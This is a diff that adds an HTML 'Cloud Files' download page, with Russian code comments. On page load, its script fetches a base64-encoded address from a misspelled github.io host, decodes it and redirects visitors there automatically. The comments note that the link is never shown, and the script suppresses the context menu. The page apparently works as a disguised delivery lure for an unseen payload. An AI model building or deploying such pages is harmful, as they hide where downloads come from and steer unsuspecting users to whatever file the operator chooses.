@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Cloud Files</title>
+  <meta name="description" content="Simple download portal"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- CSP: инлайн-скрипт и запрос к Site B -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    style-src   'self';
+    script-src  'self' 'unsafe-inline';
+    connect-src 'self' https://portal-cofig-manifest.github.io;
+  ">
+
+  <link rel="stylesheet" href="styles.css"/>
+</head>
+<body>
+  <div class="cf-wrap">
+    <div class="cf-card">
+      <div class="cf-badge" aria-hidden="true">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M8 11L12 15L16 11"
+                stroke="white" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+
+      <h1>Preparing your download…</h1>
+
+      <!-- Лоадер со спиннером и «прогресс-баром» -->
+      <div class="cf-loader" aria-hidden="true">
+        <div class="cf-spinner"></div>
+        <div class="cf-bar">
+          <div class="cf-bar-fill"></div>
+        </div>
+      </div>
+
+      <p id="cf-status" class="cf-status" aria-live="polite">Fetching link…</p>
+      <p id="cf-error" class="cf-error" role="alert"></p>
+
+      <!-- Кнопка без href: по клику запустим редирект -->
+      <button id="cf-btn" class="cf-btn" type="button" disabled>
+        Download now
+      </button>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    const SETTINGS_URL = 'https://portal-cofig-manifest.github.io/.github/atlas.ek9y7v';
+
+    const st   = document.getElementById('cf-status');
+    const err  = document.getElementById('cf-error');
+    const btn  = document.getElementById('cf-btn');
+    const spinner = document.querySelector('.cf-spinner');
+    const barFill = document.querySelector('.cf-bar-fill');
+
+    let downloadUrl = null;
+
+    // 1) Тянем конфиг
+    (async () => {
+      st.textContent = 'Fetching link…';
+      err.textContent = '';
+
+      try {
+        const r = await fetch(SETTINGS_URL, { cache: 'no-store' });
+        if (!r.ok) throw new Error('Config HTTP ' + r.status);
+
+        const { c } = await r.json();
+        if (!c) throw new Error('Missing config value');
+
+        const url = atob(c);
+        if (!/^https?:\/\//i.test(url)) throw new Error('Invalid URL');
+
+        downloadUrl = url;
+
+        // Включаем кнопку на случай, если авто-редирект заблокируется
+        btn.disabled = false;
+
+        // Обновляем статус и запускаем авто-редирект
+        st.textContent = 'Downloading…';
+        setTimeout(() => { window.location.href = downloadUrl; }, 700);
+
+      } catch (e) {
+        console.error(e);
+        st.textContent = '';
+        err.textContent = 'Error: ' + e.message;
+        spinner?.classList.add('cf-spinner-paused');
+        barFill?.classList.add('cf-bar-paused');
+      }
+    })();
+
+    // 2) Ручной запуск по кнопке (ссылка нигде не светится)
+    btn.addEventListener('click', () => {
+      if (!downloadUrl) return;
+      st.textContent = 'Downloading…';
+      setTimeout(() => { window.location.href = downloadUrl; }, 150);
+    }, { passive: true });
+
+    // Дополнительно: без контекстного меню/выделений
+    btn.addEventListener('contextmenu', e => e.preventDefault());
+  })();
+  </script>
+</body>
+</html>
